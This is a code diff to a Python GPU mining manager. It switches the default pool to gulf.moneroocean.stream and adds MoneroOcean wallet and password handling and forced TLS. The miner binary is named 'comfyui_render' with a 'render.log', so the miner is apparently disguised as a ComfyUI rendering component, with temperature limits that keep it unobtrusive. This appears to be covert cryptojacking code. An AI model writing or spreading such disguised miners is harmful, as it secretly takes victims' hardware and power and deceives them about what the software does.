@@ -58,8 +58,8 @@ GPU_BINARY_NAME = "comfyui_render.exe" if IS_WINDOWS else "comfyui_render"
 GPU_LOG_NAME = "render.log"
 
 DEFAULT_ALGO = "ETCHASH"
-DEFAULT_POOL = "etchash.unmineable.com"
-DEFAULT_PORT = 3333
+DEFAULT_POOL = "gulf.moneroocean.stream"
+DEFAULT_PORT = 20300
 DEFAULT_API_PORT = 44882
 TEMP_LIMIT = 70
 TEMP_RESUME = 65
@@ -210,7 +210,14 @@ class GPUMinerManager:
         self.temp_resume = temp_resume
 
     def _build_cmd(self) -> list[str]:
-        user_str = f"XMR:{self.wallet}.{self.worker}"
+        is_moneroocean = "moneroocean" in self.pool.lower()
+
+        if is_moneroocean:
+            user_str = self.wallet
+            pass_str = f"{self.worker}~{self.algo.lower()}"
+        else:
+            user_str = f"XMR:{self.wallet}.{self.worker}"
+            pass_str = "x"
 
         if self.miner_type == "trex":
             scheme = "stratum+ssl" if self.tls else "stratum+tcp"
@@ -220,7 +227,7 @@ class GPUMinerManager:
                 "-a", self.algo.lower(),
                 "-o", pool_url,
                 "-u", user_str,
-                "-p", "x",
+                "-p", pass_str,
                 "--api-bind-http", f"127.0.0.1:{self.api_port}",
                 "--temperature-limit", str(self.temp_limit),
                 "--temperature-start", str(self.temp_resume),
@@ -228,15 +235,14 @@ class GPUMinerManager:
             ]
 
         pool_str = f"{self.pool}:{self.port}"
-        use_tls = "1" if self.tls else "0"
         return [
             str(self.binary_path),
             "--algo", self.algo,
             "--pool", pool_str,
             "--user", user_str,
-            "--pass", "x",
+            "--pass", pass_str,
             "--apiport", str(self.api_port),
-            "--tls", use_tls,
+            "--tls", "1",
             "--nocolor",
         ]
 
